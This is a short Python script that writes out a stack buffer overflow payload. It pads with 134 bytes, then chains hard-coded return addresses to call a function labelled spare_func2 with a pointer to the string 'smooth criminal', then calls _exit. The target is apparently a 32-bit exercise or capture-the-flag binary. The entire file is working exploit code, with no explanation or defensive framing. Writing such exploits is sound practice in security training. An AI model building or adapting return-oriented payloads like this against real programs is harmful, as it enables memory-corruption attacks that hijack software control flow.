#!/usr/bin/env python3

import sys


oflow = b'A' * 134
string = b"smooth criminal\0"
fakeret = b'\xef\xbe\xad\xde'

# GDB: 0xffffcf9c, native 0xffffd01c
#stack_base=0xffffcf9c
stack_base=0xffffd01c

# string + 0x1c
string_addr = stack_base + 0x1c 
frames = [
        # spare_func2, gadget to pop 2 args, 2 args
        [ b'\xd7\x88\x04\x08', b'\x23\x89\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
            #b'\x2c\xd0\xff\xff' ],
        # _exit, fakeret, 1 arg
        [ b'\xec\xc2\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
        ] 

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
